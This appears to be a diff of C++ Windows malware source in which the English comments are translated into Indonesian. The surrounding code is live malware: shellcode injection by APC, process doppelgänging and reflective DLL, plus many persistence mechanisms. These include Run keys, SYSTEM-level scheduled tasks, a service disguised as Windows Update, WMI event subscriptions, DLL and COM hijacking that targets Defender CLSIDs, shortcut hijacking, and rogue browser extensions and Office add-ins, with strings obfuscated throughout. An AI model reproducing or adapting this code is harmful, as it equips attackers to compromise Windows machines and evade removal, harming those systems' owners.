                 IWbemClassObject* pOutParams = NULL;
                 hr = pSvc->ExecMethod(_bstr_t(L"Win32_Process"), _bstr_t(L"Create"), 0, 
                                       NULL, pInParams, &pOutParams, NULL);
@@ -3139,7 +3163,7 @@ private:
             if (pClass) pClass->Release();
         }
         
-        // Cleanup
+        // cleanup
         pSvc->Release();
         pLoc->Release();
         CoUninitialize();
@@ -3182,10 +3206,10 @@ public:
         
         bool success = false;
         for (DWORD pid : pids) {
-            // Try different injection methods
+            // coba metode injeksi berbeda
             if (InjectViaAPC(pid, shellcode)) {
                 success = true;
-            } else if (InjectViaProcessDoppelgänging(pid, shellcode)) {
+            } else if (InjectViaProcessDoppelg�nging(pid, shellcode)) {
                 success = true;
             } else if (InjectViaReflectiveDLL(pid, shellcode)) {
                 success = true;
@@ -3202,7 +3226,7 @@ public:
 };
 
 // =====================================================
-// ADVANCED PERSISTENCE MECHANISMS (Continued)
+// mekanisme persistensi tingkat lanjut (lanjutan)
 // =====================================================
 class AdvancedPersistence {
 private:
@@ -3230,14 +3254,14 @@ private:
     bool InstallRegistry() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Use random registry key name
+        // gunakan nama registry key random
         wstring valueName = GetRandomString(8);
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Create registry key for startup
+        // buat registry key untuk startup
         HKEY hKey;
         if (RegCreateKeyExW(HKEY_CURRENT_USER, 
                            wstring(OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run").begin(), OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run").end()).c_str(),
@@ -3245,7 +3269,7 @@ private:
             return false;
         }
         
-        // Set registry value
+        // set registry value
         if (RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ, 
                           (const BYTE*)currentPath, 
                           (wcslen(currentPath) + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
@@ -3255,7 +3279,7 @@ private:
         
         RegCloseKey(hKey);
         
-        // Additional persistence in less common registry locations
+        // persistensi tambahan di lokasi registry kurang umum
         const vector<pair<wstring, wstring>> registryPaths = {
             {wstring(OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run").begin(), OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run").end()), wstring(OBF("").begin(), OBF("").end())},
             {wstring(OBF("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").begin(), OBF("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").end()), wstring(OBF("Shell").begin(), OBF("Shell").end())},
@@ -3284,11 +3308,11 @@ private:
     bool InstallScheduledTask() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Initialize COM
+        // inisialisasi COM
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         if (FAILED(hr)) return false;
         
-        // Set COM security levels
+        // set level security COM
         hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, 
                                 RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
         if (FAILED(hr)) {
@@ -3296,11 +3320,11 @@ private:
             return false;
         }
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Create Task Service instance
+        // buat instance Task Service
         ITaskService* pService = NULL;
         hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
         if (FAILED(hr)) {
@@ -3308,7 +3332,7 @@ private:
             return false;
         }
         
-        // Connect to Task Service
+        // koneksi ke Task Service
         hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
         if (FAILED(hr)) {
             pService->Release();
@@ -3316,7 +3340,7 @@ private:
             return false;
         }
         
-        // Get root task folder
+        // dapatkan root task folder
         ITaskFolder* pRootFolder = NULL;
         hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
         if (FAILED(hr)) {
@@ -3325,7 +3349,7 @@ private:
             return false;
         }
         
-        // Create task definition
+        // buat task definition
         ITaskDefinition* pTask = NULL;
         hr = pService->NewTask(0, &pTask);
         if (FAILED(hr)) {
@@ -3335,7 +3359,7 @@ private:
             return false;
         }
         
-        // Set registration info
+        // set registration info
         IRegistrationInfo* pRegInfo = NULL;
         hr = pTask->get_RegistrationInfo(&pRegInfo);
         if (SUCCEEDED(hr)) {
@@ -3344,7 +3368,7 @@ private:
             pRegInfo->Release();
         }
         
-        // Set principal (run with current user privileges)
+        // set principal (run dengan hak user saat ini)
         IPrincipal* pPrincipal = NULL;
         hr = pTask->get_Principal(&pPrincipal);
         if (SUCCEEDED(hr)) {
@@ -3353,7 +3377,7 @@ private:
             pPrincipal->Release();
         }
         
-        // Set task settings
+        // set task settings
         ITaskSettings* pSettings = NULL;
         hr = pTask->get_Settings(&pSettings);
         if (SUCCEEDED(hr)) {
@@ -3369,7 +3393,7 @@ private:
             pSettings->Release();
         }
         
-        // Add logon trigger
+        // tambah logon trigger
         ITriggerCollection* pTriggerCollection = NULL;
         hr = pTask->get_Triggers(&pTriggerCollection);
         if (SUCCEEDED(hr)) {
@@ -3380,7 +3404,7 @@ private:
                 hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
                 if (SUCCEEDED(hr)) {
                     pLogonTrigger->put_Id(_bstr_t(L"LogonTrigger"));
-                    pLogonTrigger->put_Delay(_bstr_t(L"PT30S")); // 30 seconds delay
+                    pLogonTrigger->put_Delay(_bstr_t(L"PT30S")); // delay 30 detik
                     pLogonTrigger->Release();
                 }
                 pTrigger->Release();
@@ -3388,7 +3412,7 @@ private:
             pTriggerCollection->Release();
         }
         
-        // Add boot trigger
+        // tambah boot trigger
         hr = pTask->get_Triggers(&pTriggerCollection);
         if (SUCCEEDED(hr)) {
             ITrigger* pTrigger = NULL;
@@ -3398,7 +3422,7 @@ private:
                 hr = pTrigger->QueryInterface(IID_IBootTrigger, (void**)&pBootTrigger);
                 if (SUCCEEDED(hr)) {
                     pBootTrigger->put_Id(_bstr_t(L"BootTrigger"));
-                    pBootTrigger->put_Delay(_bstr_t(L"PT2M")); // 2 minutes delay
+                    pBootTrigger->put_Delay(_bstr_t(L"PT2M")); // delay 2 menit
                     pBootTrigger->Release();
                 }
                 pTrigger->Release();
@@ -3406,7 +3430,7 @@ private:
             pTriggerCollection->Release();
         }
         
-        // Add action to run the executable
+        // tambah action untuk run executable
         IActionCollection* pActionCollection = NULL;
         hr = pTask->get_Actions(&pActionCollection);
         if (SUCCEEDED(hr)) {
@@ -3425,7 +3449,7 @@ private:
             pActionCollection->Release();
         }
         
-        // Register the task
+        // register task
         wstring taskName = GetRandomString(12);
         IRegisteredTask* pRegisteredTask = NULL;
         hr = pRootFolder->RegisterTaskDefinition(
@@ -3439,7 +3463,7 @@ private:
             &pRegisteredTask
         );
         
-        // Cleanup
+        // cleanup
         if (pRegisteredTask) pRegisteredTask->Release();
         pTask->Release();
         pRootFolder->Release();
@@ -3452,19 +3476,19 @@ private:
     bool InstallService() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Generate random service name
+        // generate nama service random
         wstring serviceName = GetRandomString(8);
         wstring displayName = wstring(OBF("Windows Update Service").begin(), OBF("Windows Update Service").end()) + GetRandomString(4);
         
-        // Open Service Control Manager
+        // buka Service Control Manager
         SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
         if (!hSCManager) return false;
         
-        // Create service
+        // buat service
         SC_HANDLE hService = CreateServiceW(
             hSCManager,
             serviceName.c_str(),
@@ -3482,15 +3506,15 @@ private:
             return false;
         }
         
-        // Set service description
+        // set deskripsi service
         SERVICE_DESCRIPTIONW sd = { (LPWSTR)OBF("Provides Windows update services and security patches").c_str() };
         ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
         
-        // Set service to delayed start
+        // set service ke delayed start
         SERVICE_DELAYED_AUTO_START_INFO info = { TRUE };
         ChangeServiceConfig2W(hService, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &info);
         
-        // Start the service
+        // start service
         StartService(hService, 0, NULL);
         
         CloseServiceHandle(hService);
@@ -3502,11 +3526,11 @@ private:
     bool InstallWMIEvent() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Initialize COM
+        // inisialisasi COM
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         if (FAILED(hr)) return false;
         
-        // Set COM security levels
+        // set level security COM
         hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, 
                                 RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
         if (FAILED(hr)) {
@@ -3514,11 +3538,11 @@ private:
             return false;
         }
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Obtain the initial locator to WMI
+        // dapatkan initial locator ke WMI
         IWbemLocator* pLoc = NULL;
         hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
         if (FAILED(hr)) {
@@ -3526,7 +3550,7 @@ private:
             return false;
         }
         
-        // Connect to WMI
+        // koneksi ke WMI
         IWbemServices* pSvc = NULL;
         hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\Subscription"), NULL, NULL, 0, NULL, 0, NULL, &pSvc);
         if (FAILED(hr)) {
@@ -3535,7 +3559,7 @@ private:
             return false;
         }
         
-        // Set security levels on the proxy
+        // set level security pada proxy
         hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, 
                               RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, 
                               NULL, EOAC_NONE);
@@ -3546,7 +3570,7 @@ private:
             return false;
         }
         
-        // Create event filter
+        // buat event filter
         IWbemClassObject* pFilterInst = NULL;
         IWbemClassObject* pClass = NULL;
         hr = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pClass, NULL);
@@ -3554,7 +3578,7 @@ private:
             IWbemClassObject* pInst = NULL;
             hr = pClass->SpawnInstance(0, &pInst);
             if (SUCCEEDED(hr)) {
-                // Set event filter properties
+                // set properti event filter
                 wstring filterName = GetRandomString(12);
                 VARIANT varFilterName;
                 VariantInit(&varFilterName);
@@ -3569,7 +3593,7 @@ private:
                 hr = pInst->Put(_bstr_t(L"EventNamespace"), 0, &varNS, 0);
                 VariantClear(&varNS);
                 
-                // Create query for user logon events
+                // buat query untuk event logon user
                 wstring query = OBFW(L"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'");
                 VARIANT varQL;
                 VariantInit(&varQL);
@@ -3584,7 +3608,7 @@ private:
                 hr = pInst->Put(_bstr_t(L"Query"), 0, &varQuery, 0);
                 VariantClear(&varQuery);
                 
-                // Create the filter instance
+                // buat instance filter
                 hr = pSvc->PutInstance(pInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                 if (SUCCEEDED(hr)) {
                     pFilterInst = pInst;
@@ -3603,14 +3627,14 @@ private:
             return false;
         }
         
-        // Create event consumer
+        // buat event consumer
         IWbemClassObject* pConsumerInst = NULL;
         hr = pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pClass, NULL);
         if (SUCCEEDED(hr)) {
             IWbemClassObject* pInst = NULL;
             hr = pClass->SpawnInstance(0, &pInst);
             if (SUCCEEDED(hr)) {
-                // Set consumer properties
+                // set properti consumer
                 wstring consumerName = GetRandomString(12);
                 VARIANT varName;
                 VariantInit(&varName);
@@ -3631,7 +3655,7 @@ private:
                 hr = pInst->Put(_bstr_t(L"CommandLineTemplate"), 0, &varCmd, 0);
                 VariantClear(&varCmd);
                 
-                // Create the consumer instance
+                // buat instance consumer
                 hr = pSvc->PutInstance(pInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                 if (SUCCEEDED(hr)) {
                     pConsumerInst = pInst;
@@ -3651,14 +3675,14 @@ private:
             return false;
         }
         
-        // Create binding between filter and consumer
+        // buat binding antara filter dan consumer
         IWbemClassObject* pBindingInst = NULL;
         hr = pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pClass, NULL);
         if (SUCCEEDED(hr)) {
             IWbemClassObject* pInst = NULL;
             hr = pClass->SpawnInstance(0, &pInst);
             if (SUCCEEDED(hr)) {
-                // Set binding properties
+                // set properti binding
                 VARIANT varFilter;
                 VariantInit(&varFilter);
                 varFilter.vt = VT_UNKNOWN;
@@ -3672,7 +3696,7 @@ private:
                 hr = pInst->Put(_bstr_t(L"Consumer"), 0, &varConsumer, 0);
                 VariantClear(&varConsumer);
                 
-                // Create the binding instance
+                // buat instance binding
                 hr = pSvc->PutInstance(pInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                 if (SUCCEEDED(hr)) {
                     pBindingInst = pInst;
@@ -3684,7 +3708,7 @@ private:
             pClass->Release();
         }
         
-        // Cleanup
+        // cleanup
         if (pBindingInst) pBindingInst->Release();
         if (pConsumerInst) pConsumerInst->Release();
         if (pFilterInst) pFilterInst->Release();
@@ -3698,11 +3722,11 @@ private:
     bool InstallDLLHijack() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Target directories for DLL hijacking
+        // direktori target untuk DLL hijacking
         const vector<wstring> targetDirs = {
             OBFW(L"C:\\Program Files\\Microsoft Office\\root\\Office16"),
             OBFW(L"C:\\Program Files\\Adobe\\Adobe Acrobat DC"),
@@ -3714,7 +3738,7 @@ private:
             OBFW(L"C:\\Program Files\\Windows Media Player")
         };
         
-        // Common DLL names to hijack
+        // nama DLL umum untuk di-hijack
         const vector<wstring> dllNames = {
             OBFW(L"version.dll"),
             OBFW(L"uxtheme.dll"),
@@ -3736,10 +3760,10 @@ private:
             for (const auto& dllName : dllNames) {
                 wstring targetPath = dir + L"\\" + dllName;
                 
-                // Check if DLL already exists
+                // cek jika DLL sudah ada
                 if (GetFileAttributesW(targetPath.c_str()) != INVALID_FILE_ATTRIBUTES) continue;
                 
-                // Copy our executable as the target DLL
+                // copy executable kita sebagai target DLL
                 if (CopyFileW(currentPath, targetPath.c_str(), FALSE)) {
                     success = true;
                     break;
@@ -3755,11 +3779,11 @@ private:
     bool InstallCOMHijack() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Target CLSIDs for COM hijacking
+        // target CLSIDs untuk COM hijacking
         const vector<wstring> targetClsids = {
             OBFW(L"{0358b920-0ac7-461f-98f4-58e32cd89148}"), // Windows Defender
             OBFW(L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"), // Windows Update
@@ -3781,7 +3805,7 @@ private:
                 if (RegSetValueExW(hKey, NULL, 0, REG_SZ, 
                                   (const BYTE*)currentPath, 
                                   (wcslen(currentPath) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
-                    // Set ThreadingModel
+                    // set ThreadingModel
                     wstring threadingModel = OBFW(L"Apartment");
                     if (RegSetValueExW(hKey, OBFW(L"ThreadingModel").c_str(), 0, REG_SZ, 
                                       (const BYTE*)threadingModel.c_str(), 
@@ -3801,11 +3825,11 @@ private:
     bool InstallShortcutModification() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Target shortcut locations
+        // lokasi shortcut target
         const vector<wstring> shortcutPaths = {
             OBFW(L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"),
             OBFW(L"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"),
@@ -3813,7 +3837,7 @@ private:
             OBFW(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\")
         };
         
-        // Target applications to hijack
+        // aplikasi target untuk di-hijack
         const vector<pair<wstring, wstring>> targetApps = {
             {OBFW(L"Chrome"), OBFW(L"Google Chrome.lnk")},
             {OBFW(L"Firefox"), OBFW(L"Mozilla Firefox.lnk")},
@@ -3826,7 +3850,7 @@ private:
         bool success = false;
         
         for (const auto& shortcutPath : shortcutPaths) {
-            // Expand environment variables
+            // expand environment variables
             wchar_t expandedPath[MAX_PATH];
             ExpandEnvironmentStringsW(shortcutPath.c_str(), expandedPath, MAX_PATH);
             
@@ -3835,28 +3859,28 @@ private:
             for (const auto& app : targetApps) {
                 wstring targetShortcut = wstring(expandedPath) + app.second;
                 
-                // Check if shortcut exists
+                // cek jika shortcut ada
                 if (GetFileAttributesW(targetShortcut.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
                 
-                // Create a backup of the original shortcut
+                // buat backup dari shortcut original
                 wstring backupShortcut = wstring(expandedPath) + app.first + OBFW(L"_original.lnk");
                 CopyFileW(targetShortcut.c_str(), backupShortcut.c_str(), FALSE);
                 
-                // Modify the shortcut to launch our executable first, then the original
+                // modifikasi shortcut untuk launch executable kita dulu, kemudian original
                 IShellLinkW* pShellLink = NULL;
                 IPersistFile* pPersistFile = NULL;
                 
                 if (CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pShellLink) == S_OK) {
                     if (pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile) == S_OK) {
                         if (pPersistFile->Load(targetShortcut.c_str(), STGM_READ) == S_OK) {
-                            // Get original target path
+                            // dapatkan path target original
                             wchar_t originalTarget[MAX_PATH];
                             if (pShellLink->GetPath(originalTarget, MAX_PATH, NULL, SLGP_SHORTPATH) == S_OK) {
-                                // Set new target to our executable with original as argument
+                                // set target baru ke executable kita dengan original sebagai argumen
                                 wstring newTarget = wstring(currentPath) + OBFW(L" \"") + wstring(originalTarget) + OBFW(L"\"");
                                 pShellLink->SetPath(newTarget.c_str());
                                 
-                                // Save the modified shortcut
+                                // simpan shortcut yang dimodifikasi
                                 if (pPersistFile->Save(targetShortcut.c_str(), TRUE) == S_OK) {
                                     success = true;
                                 }
@@ -3879,11 +3903,11 @@ private:
     bool InstallBrowserExtension() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Create a simple browser extension manifest
+        // buat manifest extension browser sederhana
         wstring manifest = LR"({
             "manifest_version": 2,
             "name": "Security Extension",
@@ -3900,7 +3924,7 @@ private:
             }]
         })";
         
-        // Create a simple background script
+        // buat background script sederhana
         wstring backgroundScript = LR"(
             chrome.runtime.onInstalled.addListener(function() {
                 console.log("Security extension installed");
@@ -3913,13 +3937,13 @@ private:
             });
         )";
         
-        // Create a simple content script
+        // buat content script sederhana
         wstring contentScript = LR"(
             console.log("Security extension loaded");
-            // Here we would inject our payload or collect data
+            // di sini kita akan inject payload kita atau koleksi data
         )";
         
-        // Target browser extension directories
+        // direktori extension browser target
         const vector<wstring> browserPaths = {
             OBFW(L"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Extensions\\"),
             OBFW(L"%APPDATA%\\Mozilla\\Firefox\\Profiles\\"),
@@ -3929,40 +3953,40 @@ private:
         bool success = false;
         
         for (const auto& browserPath : browserPaths) {
-            // Expand environment variables
+            // expand environment variables
             wchar_t expandedPath[MAX_PATH];
             ExpandEnvironmentStringsW(browserPath.c_str(), expandedPath, MAX_PATH);
             
             if (GetFileAttributesW(expandedPath) == INVALID_FILE_ATTRIBUTES) continue;
             
-            // Generate random extension ID
+            // generate ID extension random
             wstring extensionId = GetRandomString(32);
             wstring extensionDir = wstring(expandedPath) + extensionId;
             
-            // Create extension directory
+            // buat direktori extension
             if (CreateDirectoryW(extensionDir.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
-                // Write manifest.json
+                // tulis manifest.json
                 wstring manifestPath = extensionDir + OBFW(L"\\manifest.json");
                 ofstream manifestFile(to_string(manifestPath));
                 if (manifestFile.is_open()) {
                     manifestFile << string(manifest.begin(), manifest.end());
                     manifestFile.close();
                     
-                    // Write background.js
+                    // tulis background.js
                     wstring backgroundPath = extensionDir + OBFW(L"\\background.js");
                     ofstream backgroundFile(to_string(backgroundPath));
                     if (backgroundFile.is_open()) {
                         backgroundFile << string(backgroundScript.begin(), backgroundScript.end());
                         backgroundFile.close();
                         
-                        // Write content.js
+                        // tulis content.js
                         wstring contentPath = extensionDir + OBFW(L"\\content.js");
                         ofstream contentFile(to_string(contentPath));
                         if (contentFile.is_open()) {
                             contentFile << string(contentScript.begin(), contentScript.end());
                             contentFile.close();
                             
-                            // Copy our executable as part of the extension
+                            // copy executable kita sebagai bagian dari extension
                             wstring exePath = extensionDir + OBFW(L"\\extension_host.exe");
                             if (CopyFileW(currentPath, exePath.c_str(), FALSE)) {
                                 success = true;
@@ -3981,11 +4005,11 @@ private:
     bool InstallOfficeAddin() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Create a simple Office add-in manifest
+        // buat manifest Office add-in sederhana
         wstring manifest = LR"(
             <?xml version="1.0" encoding="UTF-8"?>
             <OfficeApp xmlns="http://schemas.microsoft.com/office/appforoffice/1.1"
@@ -4009,7 +4033,7 @@ private:
             </OfficeApp>
         )";
         
-        // Create a simple HTML file for the add-in
+        // buat file HTML sederhana untuk add-in
         wstring htmlContent = LR"(
             <!DOCTYPE html>
             <html>
@@ -4021,10 +4045,10 @@ private:
                 <script>
                     Office.initialize = function(reason) {
                         $(document).ready(function() {
-                            // Initialize add-in
+                            // inisialisasi add-in
                             console.log("Security add-in initialized");
                             
-                            // Here we would inject our payload or collect data
+                            // di sini kita akan inject payload kita atau koleksi data
                         });
                     };
                 </script>
@@ -4036,7 +4060,7 @@ private:
             </html>
         )";
         
-        // Target Office add-in directories
+        // direktori Office add-in target
         const vector<wstring> officePaths = {
             OBFW(L"%APPDATA%\\Microsoft\\Templates\\"),
             OBFW(L"%APPDATA%\\Microsoft\\Word\\Startup\\"),
@@ -4047,33 +4071,33 @@ private:
         bool success = false;
         
         for (const auto& officePath : officePaths) {
-            // Expand environment variables
+            // expand environment variables
             wchar_t expandedPath[MAX_PATH];
             ExpandEnvironmentStringsW(officePath.c_str(), expandedPath, MAX_PATH);
             
             if (GetFileAttributesW(expandedPath) == INVALID_FILE_ATTRIBUTES) continue;
             
-            // Generate random add-in name
+            // generate nama add-in random
             wstring addinName = GetRandomString(8);
             wstring addinDir = wstring(expandedPath) + addinName;
             
-            // Create add-in directory
+            // buat direktori add-in
             if (CreateDirectoryW(addinDir.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
-                // Write manifest.xml
+                // tulis manifest.xml
                 wstring manifestPath = addinDir + OBFW(L"\\manifest.xml");
                 ofstream manifestFile(to_string(manifestPath));
                 if (manifestFile.is_open()) {
                     manifestFile << string(manifest.begin(), manifest.end());
                     manifestFile.close();
                     
-                    // Write addin.html
+                    // tulis addin.html
                     wstring htmlPath = addinDir + OBFW(L"\\addin.html");
                     ofstream htmlFile(to_string(htmlPath));
                     if (htmlFile.is_open()) {
                         htmlFile << string(htmlContent.begin(), htmlContent.end());
                         htmlFile.close();
                         
-                        // Copy our executable as part of the add-in
+                        // copy executable kita sebagai bagian dari add-in
                         wstring exePath = addinDir + OBFW(L"\\addin_host.exe");
                         if (CopyFileW(currentPath, exePath.c_str(), FALSE)) {
                             success = true;
@@ -4091,11 +4115,11 @@ private:
     bool InstallScheduledTaskWithTrigger() {
         lock_guard<mutex> lock(persistenceMutex);
         
-        // Initialize COM
+        // inisialisasi COM
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         if (FAILED(hr)) return false;
         
-        // Set COM security levels
+        // set level security COM
         hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, 
                                 RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
         if (FAILED(hr)) {
@@ -4103,11 +4127,11 @@ private:
             return false;
         }
         
-        // Get current process path
+        // dapatkan path proses saat ini
         wchar_t currentPath[MAX_PATH];
         GetModuleFileNameW(NULL, currentPath, MAX_PATH);
         
-        // Create Task Service instance
+        // buat instance Task Service
         ITaskService* pService = NULL;
         hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
         if (FAILED(hr)) {
@@ -4115,7 +4139,7 @@ private:
             return false;
         }
         
-        // Connect to Task Service
+        // koneksi ke Task Service
         hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
         if (FAILED(hr)) {
             pService->Release();
@@ -4123,7 +4147,7 @@ private:
             return false;
         }
         
-        // Get root task folder
+        // dapatkan root task folder
         ITaskFolder* pRootFolder = NULL;
         hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
         if (FAILED(hr)) {
@@ -4132,7 +4156,7 @@ private:
             return false;
         }
         
-        // Create task definition
+        // buat task definition
         ITaskDefinition* pTask = NULL;
         hr = pService->NewTask(0, &pTask);
         if (FAILED(hr)) {
@@ -4142,7 +4166,7 @@ private:
             return false;
         }
         
-        // Set registration info
+        // set registration info
         IRegistrationInfo* pRegInfo = NULL;
         hr = pTask->get_RegistrationInfo(&pRegInfo);
         if (SUCCEEDED(hr)) {
@@ -4151,7 +4175,7 @@ private:
             pRegInfo->Release();
         }
         
-        // Set principal (run with SYSTEM privileges)
+        // set principal (run dengan hak SYSTEM)
         IPrincipal* pPrincipal = NULL;
         hr = pTask->get_Principal(&pPrincipal);
         if (SUCCEEDED(hr)) {
@@ -4161,7 +4185,7 @@ private:
             pPrincipal->Release();
         }
         
-        // Set task settings
+        // set task settings
         ITaskSettings* pSettings = NULL;
         hr = pTask->get_Settings(&pSettings);
         if (SUCCEEDED(hr)) {
@@ -4177,7 +4201,7 @@ private:
             pSettings->Release();
         }
         
-        // Add multiple triggers for different events
+        // tambah multiple triggers untuk event berbeda
         ITriggerCollection* pTriggerCollection = NULL;
         hr = pTask->get_Triggers(&pTriggerCollection);
         if (SUCCEEDED(hr)) {
@@ -4189,7 +4213,7 @@ private:
                 hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
                 if (SUCCEEDED(hr)) {
                     pLogonTrigger->put_Id(_bstr_t(L"LogonTrigger"));
-                    pLogonTrigger->put_Delay(_bstr_t(L"PT5M")); // 5 minutes delay
+                    pLogonTrigger->put_Delay(_bstr_t(L"PT5M")); // delay 5 menit
                     pLogonTrigger->Release();
                 }
                 pTrigger->Release();
@@ -4202,7 +4226,7 @@ private:
                 hr = pTrigger->QueryInterface(IID_IBootTrigger, (void**)&pBootTrigger);
                 if (SUCCEEDED(hr)) {
                     pBootTrigger->put_Id(_bstr_t(L"BootTrigger"));
-                    pBootTrigger->put_Delay(_bstr_t(L"PT10M")); // 10 minutes delay
+                    pBootTrigger->put_Delay(_bstr_t(L"PT10M")); // delay 10 menit
                     pBootTrigger->Release();
                 }
                 pTrigger->Release();
@@ -4222,7 +4246,7 @@ private:
                 pTrigger->Release();
             }
             
-            // 4. Event trigger (on system idle)
+            // 4. Event trigger (saat system idle)
             hr = pTriggerCollection->Create(TASK_TRIGGER_IDLE, &pTrigger);
             if (SUCCEEDED(hr)) {
                 IIdleTrigger* pIdleTrigger = NULL;
@@ -4237,7 +4261,7 @@ private:
             pTriggerCollection->Release();
         }
         
-        // Add action to run the executable
+        // tambah action untuk run executable
         IActionCollection* pActionCollection = NULL;
         hr = pTask->get_Actions(&pActionCollection);
         if (SUCCEEDED(hr)) {
@@ -4256,7 +4280,7 @@ private:
             pActionCollection->Release();
         }
         
-        // Register the task
+        // register task
         wstring taskName = OBFW(L"Microsoft\\Windows\\WindowsUpdate\\") + GetRandomString(12);
         IRegisteredTask* pRegisteredTask = NULL;
         hr = pRootFolder->RegisterTaskDefinition(
@@ -4270,7 +4294,7 @@ private:
             &pRegisteredTask
         );
         
-        // Cleanup
+        // cleanup
         if (pRegisteredTask) pRegisteredTask->Release();
         pTask->Release();
         pRootFolder->Release();
@@ -4284,7 +4308,7 @@ public:
     bool EstablishPersistence() {
         bool success = false;
         
-        // Try multiple persistence methods
+        // coba banyak metode persistensi
         if (InstallRegistry()) success = true;
         if (InstallScheduledTask()) success = true;
         if (InstallService()) success = true;
@@ -4300,10 +4324,10 @@ public:
     }
     
     bool CheckPersistence() {
-        // Check if any of our persistence mechanisms are still active
+        // cek jika mekanisme persistensi kita masih aktif
         bool found = false;
         
-        // Check registry
+        // cek registry
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, OBFW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run").c_str(),
                           0, KEY_READ, &hKey) == ERROR_SUCCESS) {
